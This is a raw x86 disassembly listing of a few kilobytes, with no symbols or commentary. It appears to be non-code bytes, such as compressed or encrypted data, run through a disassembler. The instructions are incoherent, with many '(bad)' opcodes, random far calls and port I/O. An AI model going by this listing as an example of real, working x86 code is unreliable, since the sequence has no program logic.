  43699b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43699c:	retf   
  43699d:	add    al,0x98
  43699f:	dec    esi
  4369a0:	outs   dx,DWORD PTR ds:[esi]
  4369a1:	and    DWORD PTR [ecx],edx
  4369a3:	lds    eax,FWORD PTR [edi]
  4369a5:	mov    edi,DWORD PTR [esi+0x2]
  4369a8:	push   0x6a
  4369aa:	xor    esi,ebx
  4369ac:	(bad)  
  4369ad:	or     eax,DWORD PTR [esi]
  4369af:	clc    
  4369b0:	dec    esi
  4369b1:	loopne 0x4369f9
  4369b3:	push   ss
  4369b4:	daa    
  4369b5:	xchg   DWORD PTR [edx-0x4d],edi
  4369b8:	mov    bh,0xb8
  4369ba:	adc    al,0xd3
  4369bc:	add    al,0xcd
  4369be:	sbb    eax,0x576042a1
  4369c3:	or     ecx,DWORD PTR [edx+0x36]
  4369c6:	and    esp,esi
  4369c8:	inc    edi
  4369c9:	or     al,0xd8
  4369cb:	push   cs
  4369cc:	ret    
  4369cd:	bound  ebp,QWORD PTR [edx+0x47]
  4369d0:	inc    esi
  4369d1:	add    DWORD PTR [edi],esi
  4369d3:	and    ecx,DWORD PTR [edi+0xe9ae287]
  4369d9:	mov    esp,edi
  4369db:	stos   DWORD PTR es:[edi],eax
  4369dc:	xchg   ebx,eax
  4369dd:	and    BYTE PTR [ebx-0x2deb67ff],ah
  4369e3:	(bad)  
  4369e5:	mov    edx,DWORD PTR [edi-0x73210120]
  4369eb:	sub    BYTE PTR [ebp+0x5ff40f79],bh
  4369f1:	mov    ecx,DWORD PTR [ecx+ebp*1]
  4369f4:	scas   eax,DWORD PTR es:[edi]
  4369f5:	shr    ebp,1
  4369f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4369f8:	fwait
  4369f9:	push   edi
  4369fa:	adc    ebx,DWORD PTR [eax+eiz*2]
  4369fd:	xchg   edi,eax
  4369fe:	(bad)  
  4369ff:	inc    ebx
  436a00:	pop    esp
  436a01:	mov    ds:0x8c8e2599,eax
  436a06:	mov    ebp,0xcf93177b
  436a0b:	inc    ebp
  436a0c:	push   esp
  436a0d:	add    dl,BYTE PTR [eax-0x7e]
  436a10:	sbb    edx,DWORD PTR [edx-0x63]
  436a13:	mov    esi,0xb4c40c56
  436a18:	fld    TBYTE PTR [edi-0x41cb8eb]
  436a1e:	in     eax,0x53
  436a20:	mov    dl,0x15
  436a22:	mov    al,0x83
  436a24:	mov    eax,0x51118298
  436a29:	add    dl,BYTE PTR [ebx+0x1a827750]
  436a2f:	add    ebp,DWORD PTR [edi+0x77]
  436a32:	mov    ebp,0x8c0fb28e
  436a37:	dec    esi
  436a38:	dec    edi
  436a39:	scas   eax,DWORD PTR es:[edi]
  436a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436a3b:	je     0x4369df
  436a3d:	out    0x9c,eax
  436a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436a40:	sbb    bh,BYTE PTR [ebx-0x2e]
  436a43:	push   eax
  436a44:	and    al,0x9
  436a46:	adc    eax,0x4ff60a58
  436a4b:	loopne 0x4369ff
  436a4d:	jno    0x4369fc
  436a4f:	jne    0x4369e5
  436a51:	sub    al,0x14
  436a53:	push   0x771d0b26
  436a58:	push   ebp
  436a59:	daa    
  436a5a:	mov    ah,0xc5
  436a5c:	mov    ch,0x9d
  436a5e:	jmp    0x436ade
  436a60:	mov    dl,0x3f
  436a62:	in     al,0x46
  436a64:	jbe    0x436a21
  436a66:	cmp    eax,0xa9ffe
  436a6b:	adc    cl,BYTE PTR [ecx+0x2be571f2]
  436a71:	ret    
  436a72:	ins    BYTE PTR es:[edi],dx
  436a73:	xor    DWORD PTR [edx-0x4f782462],esi
  436a79:	aam    0xe8
  436a7b:	xor    eax,0x4a8a0932
  436a80:	aad    0xb4
  436a82:	inc    edx
  436a83:	dec    ecx
  436a84:	repnz in eax,dx
  436a86:	out    0x75,al
  436a88:	mov    dl,0x81
  436a8a:	repnz fst QWORD PTR [edx+ebx*8]
  436a8e:	sub    BYTE PTR [ebx-0x2c9ef4ad],cl
  436a94:	mov    ch,0xcb
  436a96:	push   ss
  436a97:	fld    DWORD PTR [ebx+eax*1]
  436a9a:	call   0xbe7b:0x218135d8
  436aa1:	nop
  436aa2:	shl    DWORD PTR [edi-0x62918d7e],cl
  436aa8:	xor    DWORD PTR [edi+0x79],esp
  436aab:	cmp    ebx,DWORD PTR [esi+0x1d]
  436aae:	cdq    
  436aaf:	jmp    0x46c97078
  436ab4:	je     0x436a71
  436ab6:	clc    
  436ab7:	fidivr WORD PTR [eax]
  436ab9:	or     ebx,DWORD PTR [ebx+0x1a7e0aed]
  436abf:	data16 jb 0x436ae5
  436ac2:	mov    dh,0xd3
  436ac4:	inc    BYTE PTR [ecx-0x67]
  436ac7:	jne    0x436b0f
  436ac9:	fwait
  436aca:	and    eax,0x89349e77
  436acf:	pop    ss
  436ad0:	ror    DWORD PTR [ebx],cl
  436ad2:	cmp    eax,0x225c2b80
  436ad7:	mov    edi,0x8299abdb
  436adc:	sub    al,0xc8
  436ade:	push   cs
  436adf:	outs   dx,BYTE PTR ds:[esi]
  436ae0:	retf   0xef93
  436ae3:	ret    
  436ae4:	cli    
  436ae5:	je     0x436a93
  436ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436ae8:	push   ds
  436ae9:	call   0x2372d5e6
  436aee:	and    eax,0xa4a0b2e0
  436af3:	dec    esp
  436af4:	pop    ds
  436af5:	jo     0x436abf
  436af7:	pushf  
  436af8:	dec    ebp
  436af9:	or     ebx,DWORD PTR [edx]
  436afb:	dec    edi
  436afc:	xor    al,0x61
  436afe:	test   al,0x90
  436b00:	fisttp QWORD PTR [ebp-0x66]
  436b03:	jl     0x436b7d
  436b05:	lods   al,BYTE PTR ds:[esi]
  436b06:	push   0x75
  436b08:	xchg   esi,eax
  436b09:	repz jno 0x436ab5
  436b0c:	fcmovne st,st(4)
  436b0e:	(bad)  [ebx+0x72d24cf2]
  436b14:	mov    edx,0xf7789abb
  436b19:	sub    BYTE PTR [esi+ebp*8],dl
  436b1c:	mov    bl,0xb3
  436b1e:	js     0x436ac7
  436b20:	jg     0x436b84
  436b22:	outs   dx,DWORD PTR ds:[esi]
  436b23:	das    
  436b24:	iret   
  436b25:	sub    eax,0x2440dfc5
  436b2a:	cdq    
  436b2b:	jge    0x436ad4
  436b2d:	dec    edx
  436b2e:	cs mov edx,0x25bafba2
  436b34:	ror    DWORD PTR [ebx],0xd1
  436b37:	sbb    edx,ebx
  436b39:	xchg   esp,edi
  436b3b:	test   BYTE PTR ds:[edi+0xb1a95a6],0x2
  436b43:	test   al,0xa5
  436b45:	addr16 jmp 0x1dae:0x830b783d
  436b4d:	enter  0xd40c,0x17
  436b51:	daa    
  436b52:	call   0x456a:0xac84ef62
  436b59:	(bad)  
  436b5a:	cmc    
  436b5b:	mov    al,ds:0xcc13eab3
  436b60:	outs   dx,DWORD PTR ds:[esi]
  436b61:	mov    ebp,DWORD PTR [ebx-0x6bf02d64]
  436b67:	fcmovbe st,st(0)
  436b69:	pop    ss
  436b6a:	dec    esi
  436b6b:	inc    edi
  436b6c:	repz add eax,0xb4aa41f
  436b72:	jns    0x436b78
  436b74:	add    ebx,DWORD PTR [edi]
  436b76:	jecxz  0x436b50
  436b78:	pop    ecx
  436b79:	cmp    DWORD PTR [edx],0xa04ce13d
  436b7f:	into   
  436b80:	cdq    
  436b81:	mov    ecx,DWORD PTR [edx-0x294ae50e]
  436b87:	in     eax,0xd6
  436b89:	or     esp,DWORD PTR [edx+0x7c6e4fb6]
  436b8f:	ficom  WORD PTR [ebp+0x31d9a26]
  436b95:	stos   BYTE PTR es:[edi],al
  436b96:	test   al,0x9
  436b98:	mov    ecx,0x1aa9d8ac
  436b9d:	dec    esi
  436b9e:	or     dl,ch
  436ba0:	push   edx
  436ba1:	xor    bl,BYTE PTR [eax+0x60]
  436ba4:	xor    al,0x48
  436ba6:	pop    edx
  436ba7:	mov    ch,0xff
  436ba9:	rol    DWORD PTR [esi-0x13],1
  436bac:	scas   al,BYTE PTR es:[edi]
  436bad:	or     edx,DWORD PTR [edi+0x79]
  436bb0:	test   eax,0x1825287f
  436bb5:	in     eax,dx
  436bb6:	call   0x1e70:0x8928146b
  436bbd:	cmp    eax,0xdd85eb65
  436bc2:	call   0x3940:0x524e643c
  436bc9:	aas    
  436bca:	call   0x7444:0xf1a9a4bc
  436bd1:	mov    cl,0x51
  436bd3:	xor    DWORD PTR [edx],0xffffffad
  436bd6:	mov    ebp,0x690636a0
  436bdb:	aaa    
  436bdc:	lods   eax,DWORD PTR ds:[esi]
  436bdd:	dec    esi
  436bde:	fcomp  st(1)
  436be0:	mov    dl,0x64
  436be2:	retf   
  436be3:	xor    BYTE PTR [esi],dl
  436be5:	loope  0x436b76
  436be7:	jb     0x436c19
  436be9:	or     esp,DWORD PTR ds:0xd991ee2b
  436bef:	mov    ds:0x8e9144e4,eax
  436bf4:	inc    edx
  436bf5:	mov    ch,0x2e
  436bf7:	daa    
  436bf8:	in     al,dx
  436bf9:	jb     0x436b9b
  436bfb:	clc    
  436bfc:	loopne 0x436c09
  436bfe:	mov    bh,0x1e
  436c00:	dec    esi
  436c01:	dec    esp
  436c02:	jge    0x436c68
  436c04:	test   DWORD PTR [edx-0x63],edi
  436c07:	cmp    esp,DWORD PTR [ecx]
  436c09:	aas    
  436c0a:	dec    esp
  436c0b:	sub    eax,0x802d3032
  436c10:	jg     0x436c1d
  436c12:	mov    ds:0x46e6f23,al
  436c17:	pop    eax
  436c18:	adc    al,0xc7
  436c1a:	call   0x4690:0x13a326dd
  436c21:	nop
  436c22:	xor    BYTE PTR [edi+0x6c373a0b],ah
  436c28:	and    edx,DWORD PTR [esi+ebx*1+0x66f6b32a]
  436c2f:	in     al,dx
  436c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436c31:	fbstp  TBYTE PTR [ecx-0x5c]
  436c34:	push   0xffffffaa
  436c36:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  436c38:	mov    dh,0x37
  436c3a:	mov    ah,0xd7
  436c3c:	push   ebp
  436c3d:	jp     0x436c12
  436c3f:	mov    ebp,0xe9f0f8af
  436c44:	mov    dl,0x57
  436c46:	and    ch,bl
  436c48:	aaa    
  436c49:	xchg   edi,eax
  436c4a:	sub    esp,DWORD PTR [edi-0x4a000411]
  436c50:	test   ecx,esi
  436c52:	fimul  DWORD PTR [eax]
  436c54:	mov    dl,0xeb
  436c56:	or     eax,esi
  436c58:	xchg   ecx,eax
  436c59:	pop    ds
  436c5a:	loopne 0x436bde
  436c5c:	hlt    
  436c5d:	or     edx,ebx
  436c5f:	into   
  436c60:	mov    eax,ds:0x35722f8f
  436c65:	aaa    
  436c66:	call   0x58e4:0x64b40198
  436c6d:	mov    ebx,0xb7eda723
  436c72:	push   eax
  436c73:	call   0x1fb6:0x5d581708
  436c7a:	jge    0x436c88
  436c7c:	push   edi
  436c7d:	bndldx bnd0,[edx-0x7]
  436c81:	test   DWORD PTR [ebx-0x59],0x93ad4ca2
  436c88:	je     0x436c0d
  436c8a:	push   0x897b2da
  436c8f:	sbb    ah,BYTE PTR [ebx]
  436c91:	loope  0x436ca0
  436c93:	mov    ds:0x5cc80b5f,al
  436c98:	aam    0x3e
  436c9a:	sub    al,0x24
  436c9c:	xor    BYTE PTR [edx-0x17],al
  436c9f:	nop
  436ca0:	lods   eax,DWORD PTR ds:[esi]
  436ca1:	sub    BYTE PTR [eax],0x54
  436ca4:	jb     0x436ccf
  436ca6:	jbe    0x436cac
  436ca8:	xor    ch,BYTE PTR [ebp+0x67]
  436cab:	aaa    
  436cac:	(bad)  
  436cad:	or     ebp,DWORD PTR [esi]
  436caf:	or     edi,DWORD PTR [edi-0x43]
  436cb2:	mov    ebp,0xa416e226
  436cb7:	mov    bl,0xb0
  436cb9:	or     DWORD PTR ds:0x3baf45b4,edi
  436cbf:	inc    edi
  436cc0:	faddp  st(5),st
  436cc2:	das    
  436cc3:	push   esi
  436cc4:	jle    0x436d42
  436cc6:	adc    al,0xa7
  436cc8:	pop    esi
  436cc9:	adc    eax,0x8630667a
  436cce:	dec    edi
  436ccf:	dec    ecx
  436cd0:	mov    dl,0x9
  436cd2:	loope  0x436d27
  436cd4:	adc    DWORD PTR [ebp+esi*8+0x3433334e],edx
  436cdb:	out    dx,eax
  436cdc:	xor    bl,BYTE PTR [eax-0x65]
  436cdf:	jnp    0x436d20
  436ce1:	pop    esi
  436ce2:	jmp    0x4b2b1f2f
  436ce7:	sub    DWORD PTR [edx],0xe533887c
  436ced:	or     ecx,DWORD PTR [edx+0x55f49e85]
  436cf3:	mov    WORD PTR [edi+edx*2-0x6b],?
  436cf7:	adc    esp,DWORD PTR [ebp-0x51]
  436cfa:	add    esp,DWORD PTR [edi+0x1b3a3e56]
  436d00:	cmp    DWORD PTR ds:0xa59952c,edx
  436d06:	int3   
  436d07:	ja     0x436d7c
  436d09:	iret   
  436d0a:	arpl   WORD PTR [ebx+0xa],dx
  436d0d:	(bad)  
  436d0e:	in     eax,0x7f
  436d10:	mov    dh,0xc0
  436d12:	adc    bh,BYTE PTR [edx-0x15]
  436d15:	jne    0x436d71
  436d17:	je     0x436ca8
  436d19:	cmp    DWORD PTR [edx+0x3912daa7],esp
  436d1f:	dec    ebx
  436d20:	ret    
  436d21:	fild   DWORD PTR [edx-0x4d]
  436d24:	mov    dl,0x8
  436d26:	mov    al,0x45
  436d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436d29:	loopne 0x436ce0
  436d2b:	jae    0x436ccb
  436d2d:	or     edi,DWORD PTR [edi]
  436d2f:	bnd jno 0x436cbf
  436d32:	mov    edi,0x9a12052c
  436d37:	je     0x436cc0
  436d39:	dec    esi
  436d3a:	sub    esp,DWORD PTR [ebx-0x5809ab86]
  436d40:	sub    dh,BYTE PTR [ecx+0x7128376]
  436d46:	jae    0x436d2f
  436d48:	mov    dl,0x84
  436d4a:	jle    0x436d5d
  436d4c:	pop    ss
  436d4d:	push   ecx
  436d4e:	cs sub al,0x15
  436d51:	or     ebx,DWORD PTR [edi]
  436d53:	jp     0x436dbb
  436d55:	(bad)  
  436d56:	xor    eax,0x64aacbec
  436d5b:	mov    eax,0x1fa131b5
  436d60:	scas   eax,DWORD PTR es:[edi]
  436d61:	rcr    BYTE PTR [edx+0x57],0x18
  436d65:	mov    ebp,DWORD PTR [esi-0x5a523559]
  436d6b:	outs   dx,DWORD PTR ds:[esi]
  436d6c:	popf   
  436d6d:	sub    eax,0x3794e6cc
  436d72:	fwait
  436d73:	lock mov dl,0xc6
  436d76:	lods   eax,DWORD PTR ds:[esi]
  436d77:	das    
  436d78:	mov    al,ds:0x3eb10759
  436d7d:	into   
  436d7e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  436d80:	(bad)  
  436d81:	rol    BYTE PTR [edi-0xf],cl
  436d84:	icebp  
  436d85:	mov    dl,0xa5
  436d87:	lods   eax,DWORD PTR ds:[esi]
  436d88:	and    BYTE PTR [ebx],cl
  436d8a:	mov    esp,0x2384cfc
  436d8f:	and    dl,cl
  436d91:	or     ebx,DWORD PTR [ebx]
  436d93:	in     eax,0xf2
  436d95:	out    0xa4,eax
  436d97:	cs push ds
  436d99:	sub    ebx,DWORD PTR [edx-0x48468398]
  436d9f:	aaa    
  436da0:	jo     0x436dd8
  436da2:	daa    
  436da3:	mov    edx,0x273faf58
  436da8:	ret    0x352e
  436dab:	mov    ch,0xe3
  436dad:	xchg   ebx,eax
  436dae:	test   DWORD PTR [edi+eiz*8-0x1f036577],ebx
  436db5:	mov    eax,0xc6e2bcc
  436dba:	cmp    eax,0x771c8136
  436dbf:	daa    
  436dc0:	xchg   edx,eax
  436dc1:	push   edi
  436dc2:	mov    esi,0xda33ae57
  436dc7:	psllq  mm5,QWORD PTR [eax+0x7ceb25c5]
  436dce:	inc    esi
  436dcf:	aad    0xb6
  436dd1:	sbb    eax,0xf76d8dd1
  436dd6:	jo     0x436d76
  436dd8:	mov    WORD PTR [ebx],cs
  436dda:	sbb    BYTE PTR [esi],0x15
  436ddd:	pop    edx
  436dde:	add    esi,DWORD PTR [edi]
  436de0:	or     cl,BYTE PTR [ebx]
  436de2:	mov    ebp,ss
  436de4:	shl    BYTE PTR [edi+0xe1af440],cl
  436dea:	call   0x970d:0x6fa473de
  436df1:	mov    ebp,0x7b3037c2
  436df6:	(bad)  
  436df8:	ret    
  436df9:	or     eax,0x70e6ab2
  436dfe:	ins    BYTE PTR es:[edi],dx
  436dff:	or     ebp,esi
  436e01:	jbe    0x436e65
  436e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436e04:	out    0x9e,eax
  436e06:	popf   
  436e07:	cld    
  436e08:	dec    edi
  436e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436e0a:	push   0xffffffa4
  436e0c:	cs ins BYTE PTR es:[edi],dx
  436e0e:	sahf   
  436e0f:	jmp    0x436db3
  436e11:	in     eax,dx
  436e12:	dec    edx
  436e13:	icebp  
  436e14:	and    esp,ebx
  436e16:	call   0x1f7d:0xacba8930
  436e1d:	mov    cl,0x3c
  436e1f:	fadd   QWORD PTR [eax+0x5]
  436e22:	and    al,0x6
  436e24:	scas   al,BYTE PTR es:[edi]
  436e25:	bound  esp,QWORD PTR [edx-0x658156b7]
  436e2b:	ds adc edx,0xffffffcc
  436e2f:	fcmovnb st,st(6)
  436e31:	and    dl,BYTE PTR [edi+eiz*4+0x6198a1b8]
  436e38:	inc    eax
  436e39:	pop    edi
  436e3a:	dec    ebx
  436e3b:	inc    ebp
  436e3c:	mov    dl,0x8c
  436e3e:	jo     0x436dea
  436e40:	add    esi,DWORD PTR [edx]
  436e42:	out    dx,eax
  436e43:	push   edx
  436e44:	ds mov bl,0xfc
  436e47:	mov    al,ds:0x6e3f404b
  436e4c:	lds    ebx,FWORD PTR [ebx+0x76]
  436e4f:	jns    0x436e04
  436e51:	push   edi
  436e52:	fwait
  436e53:	pop    ecx
  436e54:	add    esp,DWORD PTR [edi]
  436e56:	les    edi,FWORD PTR [ebx+0x286ae54e]
  436e5c:	adc    BYTE PTR [ebx+esi*2],al
  436e5f:	sbb    cl,BYTE PTR [ecx-0x4ccd4548]
  436e65:	das    
  436e66:	(bad)  
  436e67:	lahf   
  436e68:	mov    dl,0xb1
  436e6a:	inc    edx
  436e6b:	hlt    
  436e6c:	nop
  436e6d:	jbe    0x436e37
  436e6f:	and    esp,ecx
  436e71:	mov    ebx,0xf2dba791
  436e76:	mul    ebp
  436e78:	aaa    
  436e79:	add    esp,ebx
  436e7b:	inc    edi
  436e7c:	mov    dl,0xc7
  436e7e:	dec    edx
  436e7f:	mov    al,ds:0xbea0dd4e
  436e84:	out    0xb,al
  436e86:	add    ebx,ebx
  436e88:	stc    
  436e89:	mov    eax,0x53062bc4
  436e8e:	push   0x64
  436e90:	mov    ch,0x88
  436e92:	test   eax,0x4d632330
  436e97:	shl    DWORD PTR [ebx+0x3d],cl
  436e9a:	mov    al,ds:0xad2d526f
  436e9f:	mov    edi,esp
  436ea1:	shr    DWORD PTR [ebx],1
  436ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436ea4:	icebp  
  436ea5:	clc    
  436ea6:	enter  0x4f4a,0x33
  436eaa:	call   0xdd2a:0x1ac215cc
  436eb1:	icebp  
  436eb2:	imul   esp,DWORD PTR [edi+0x2bec4190],0xc
  436eb9:	mov    ah,0xe6
  436ebb:	sbb    dh,BYTE PTR [ebx+0x54f34b7]
  436ec1:	xor    al,0xed
  436ec3:	pop    ebx
  436ec4:	jp     0x436ef9
  436ec6:	add    edx,DWORD PTR [ebp+0x5e]
  436ec9:	or     ebx,DWORD PTR [ecx+eax*8]
  436ecc:	jmp    0x9a9b:0xde846e48
  436ed3:	lea    ecx,[esi-0x4eef0ec1]
  436ed9:	mov    BYTE PTR [eax+0x15584da8],ah
  436edf:	xor    BYTE PTR [edx-0xa],0x38
  436ee3:	sub    al,ch
  436ee5:	pop    es
  436ee6:	out    0xff,eax
  436ee8:	mov    dl,0x6c
  436eea:	adc    bl,BYTE PTR [edx]
  436eec:	jno    0x436f54
  436eee:	mov    esi,0xd847af0e
  436ef3:	pusha  
  436ef4:	mov    dl,0x6d
  436ef6:	clc    
  436ef7:	cmp    ch,BYTE PTR [ebx+0x36]
  436efa:	das    
  436efb:	inc    edi
  436efc:	inc    eax
  436efd:	call   FWORD PTR [esi-0x55b24cdc]
  436f03:	push   edi
  436f04:	xor    bl,BYTE PTR [ebx]
  436f06:	div    BYTE PTR [esp+ebp*2+0x47]
  436f0a:	xchg   edx,eax
  436f0b:	adc    esi,DWORD PTR [edx-0x3f9dfe64]
  436f11:	sbb    BYTE PTR ds:0x6652b2c1,ch
  436f17:	retf   0x2647
  436f1a:	xchg   BYTE PTR [edx],ah
  436f1c:	jns    0x436f27
  436f1e:	in     al,0xd6
  436f20:	or     eax,0xd24bf99b
  436f25:	xchg   edi,eax
  436f26:	xchg   ebx,eax
  436f27:	add    cl,BYTE PTR [edi-0x595c0b7d]
  436f2d:	test   dl,ah
  436f2f:	inc    eax
  436f30:	jb     0x436f4c
  436f32:	stos   BYTE PTR es:[edi],al
  436f33:	pop    esi
  436f34:	in     eax,0x25
  436f36:	inc    edi
  436f37:	adc    esi,DWORD PTR [eax-0x49f61ef5]
  436f3d:	retf   0x45df
  436f40:	mov    dl,0x5f
  436f42:	lds    ebp,FWORD PTR [ecx-0x7d926a0b]
  436f48:	inc    ecx
  436f49:	or     ebx,edx
  436f4b:	sub    eax,0x5cbc997f
  436f50:	sti    
  436f51:	popf   
  436f52:	xchg   ebp,eax
  436f53:	inc    ebp
  436f54:	mov    ah,0xc9
  436f56:	shl    bh,1
  436f58:	sub    eax,DWORD PTR [ebx]
  436f5a:	mov    ?,eax
  436f5c:	xchg   esi,eax
  436f5d:	inc    ebx
  436f5e:	fs jmp 0x436eef
  436f61:	push   0x7cd3a09a
  436f66:	je     0x436f56
  436f68:	cmp    dh,BYTE PTR [ecx]
  436f6a:	and    ah,BYTE PTR [ebx-0x65428e38]
  436f70:	popa   
  436f71:	push   ebp
  436f72:	cmp    esp,DWORD PTR [edx-0x5838b20b]
  436f78:	and    eax,0x533b4b3d
  436f7d:	cmp    DWORD PTR [ebx+0x7c10b38f],ebx
  436f83:	xlat   BYTE PTR ds:[ebx]
  436f84:	jp     0x436ffc
  436f86:	pop    esi
  436f87:	push   0x4d200b00
  436f8c:	add    eax,DWORD PTR [ebx]
  436f8e:	or     bl,0x63
  436f91:	mov    dh,0x9a
  436f93:	sbb    ch,dl
  436f95:	sbb    eax,0xa1a895b
  436f9a:	jecxz  0x436f42
  436f9c:	and    ebp,eax
  436f9e:	neg    edi
  436fa0:	add    edi,DWORD PTR [edi]
  436fa2:	scas   eax,DWORD PTR es:[edi]
  436fa3:	dec    edi
  436fa4:	stos   DWORD PTR es:[edi],eax
  436fa5:	pop    ecx
  436fa6:	call   0xc5bf:0x18cdce70
  436fad:	inc    esi
  436fae:	inc    ebp
  436faf:	cmp    ch,BYTE PTR [edx+0x4d]
  436fb2:	out    dx,al
  436fb3:	xlat   BYTE PTR ds:[ebx]
  436fb4:	mov    ecx,0xe072f82c
  436fb9:	mov    ebp,DWORD PTR [eax+0x75]
  436fbc:	xchg   ebx,eax
  436fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436fbe:	cdq    
  436fbf:	lahf   
  436fc0:	jmp    0x437028
  436fc2:	sbb    cl,BYTE PTR [eax-0x491a458]
  436fc8:	xor    DWORD PTR [eax+0x27339495],edx
  436fce:	nop
  436fcf:	out    0x32,eax
  436fd1:	scas   eax,DWORD PTR es:[edi]
  436fd2:	mov    bh,0x33
  436fd4:	cwde   
  436fd5:	or     al,cl
  436fd7:	push   esi
  436fd8:	xchg   ebp,eax
  436fd9:	hlt    
  436fda:	xchg   ebp,eax
  436fdb:	out    dx,al
  436fdc:	mov    ch,BYTE PTR [ebx+0x14]
  436fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436fe0:	out    dx,al
  436fe1:	ss int3 
  436fe3:	cwde   
  436fe4:	out    dx,al
  436fe5:	jb     0x436f81
  436fe7:	mov    al,ds:0x42934f65
  436fec:	loopne 0x436f8c
  436fee:	das    
  436fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436ff0:	or     ah,dl
  436ff2:	sub    eax,DWORD PTR [ecx-0x67a7023e]
  436ff8:	push   esp
  436ff9:	sti    
  436ffa:	test   DWORD PTR [ebx],esp
  436ffc:	iret   
  436ffd:	add    DWORD PTR [ebp-0x2a],ebx
  437000:	ja     0x43702e
  437002:	dec    edx
  437003:	pop    eax
  437004:	push   cs
  437005:	not    DWORD PTR [edx]
  437007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437008:	adc    ch,BYTE PTR [esi-0x6479fa64]
  43700e:	(bad)  
  43700f:	mov    cl,0xb2
  437011:	aam    0xb3
  437013:	int    0xd5
  437015:	jl     0x436ff6
  437017:	dec    ebx
  437018:	or     ecx,DWORD PTR [edx]
  43701a:	sbb    BYTE PTR [ecx],bh
  43701c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43701d:	outs   dx,BYTE PTR ds:[esi]
  43701e:	stos   WORD PTR es:[edi],ax
  437020:	test   BYTE PTR [ebx-0x2f],bh
  437023:	or     eax,0x161838a
  437028:	add    BYTE PTR [ecx-0x37eb666],bl
  43702e:	lods   al,BYTE PTR ds:[si]
  437030:	xlat   BYTE PTR ds:[ebx]
  437031:	outs   dx,BYTE PTR ds:[esi]
  437032:	xor    BYTE PTR [ebp-0x3d],0x8b
  437036:	div    DWORD PTR [edx+0x27]
  437039:	sub    al,0x87
  43703b:	sar    ecx,cl
  43703d:	gs pop edx
  43703f:	mov    ah,0xa5
  437041:	add    cl,bl
  437043:	mov    BYTE PTR [bp+di],cl
  437046:	xor    ebp,DWORD PTR [ecx+ebp*4]
  437049:	pop    ebx
  43704a:	test   eax,eax
  43704c:	psubusb mm3,QWORD PTR [edx-0x69589bca]
  437053:	add    al,0x2b
  437055:	xlat   BYTE PTR ds:[ebx]
  437056:	imul   esp,DWORD PTR [edi-0x1d76def3],0xcd8a1e33
  437060:	mov    dl,0x3b
  437062:	jbe    0x43709b
  437064:	std    
  437065:	mov    ebx,0xb7814c2
  43706a:	jl     0x437008
  43706c:	int    0x7f
  43706e:	clc    
  43706f:	fsubp  st(7),st
  437071:	int    0x99
  437073:	mov    ?,WORD PTR [esi]
  437075:	mov    bh,0x6b
  437077:	jmp    0x90df33b6
  43707c:	jg     0x4370b5
  43707e:	lock (bad) 
  437080:	(bad)  
  437081:	rcr    BYTE PTR [edx-0x42c63900],cl
  437087:	repnz cwde 
  437089:	mov    eax,ds:0xfc00df99
  43708e:	outs   dx,BYTE PTR ds:[esi]
  43708f:	xchg   esp,eax
  437090:	les    edi,FWORD PTR [ebx+0xb578384]
  437096:	cdq    
  437097:	jnp    0x437038
  437099:	inc    esi
  43709a:	push   eax
  43709b:	loopne 0x43702c
  43709d:	call   0xefcefd3c
  4370a2:	xchg   esp,eax
  4370a3:	cmp    cl,BYTE PTR [ebp-0x27]
  4370a6:	adc    ah,BYTE PTR [edi-0x2754eef6]
  4370ac:	aas    
  4370ad:	cs lahf 
  4370af:	push   eax
  4370b0:	mov    dl,0xa
  4370b2:	xchg   DWORD PTR [esi],eax
  4370b4:	in     al,0x8f
  4370b6:	test   esi,ebx
  4370b8:	in     eax,0x9
  4370ba:	enter  0x6ad1,0x7b
  4370be:	arpl   WORD PTR [ecx],dx
  4370c0:	inc    ebp
  4370c1:	jmp    0x43712d
  4370c3:	ret    0xaf6
  4370c6:	dec    edx
  4370c7:	dec    DWORD PTR [edi-0x37]
  4370ca:	pop    ecx
  4370cb:	pop    edi
  4370cc:	xor    eax,ebx
  4370ce:	mov    edi,DWORD PTR [esi-0x2dc8e44e]
  4370d4:	jl     0x437108
  4370d6:	cmp    al,0x9b
  4370d8:	sbb    eax,0x8d680b16
  4370dd:	dec    ebx
  4370de:	adc    eax,0x3f35d31f
  4370e3:	mov    dh,0xb0
  4370e5:	shl    BYTE PTR [ecx],0xe7
  4370e8:	ja     0x437147
  4370ea:	sbb    al,0x67
  4370ec:	mov    ds:0x91a7d116,al
  4370f1:	or     BYTE PTR [edx+0x3e52ef89],dl
  4370f7:	add    DWORD PTR [ebp+edi*8+0x6a57356d],edi
  4370fe:	sub    eax,0xfaecfd36
  437103:	rcl    DWORD PTR [edi],0x4
  437106:	jecxz  0x43717a
  437108:	jp     0x4370fe
  43710a:	sti    
  43710b:	sbb    eax,DWORD PTR [ecx]
  43710d:	xlat   BYTE PTR ds:[ebx]
  43710e:	cmp    dl,BYTE PTR [edi-0x42]
  437111:	dec    ebp
  437112:	xchg   ebp,eax
  437113:	repnz adc DWORD PTR [edi],0x43
  437117:	addr16 bnd jns 0x4370b2
  43711b:	and    edi,DWORD PTR [edi+ecx*1+0x10117b8d]
  437122:	loop   0x43714b
  437124:	js     0x437194
  437126:	ss jae 0x4370db
  437129:	jnp    0x4370cd
  43712b:	loope  0x437115
  43712d:	jmp    0xbf96184
  437132:	and    eax,0x96f3367d
  437137:	les    ebp,FWORD PTR [ebp+0x6bd89aeb]
  43713d:	adc    esi,ebp
  43713f:	das    
  437140:	adc    eax,0x2db8a369
  437145:	fwait
  437146:	jb     0x437109
  437148:	or     DWORD PTR [ebx],ecx
  43714a:	sbb    ecx,ebp
  43714c:	jge    0x437116
  43714e:	(bad)  [ecx]
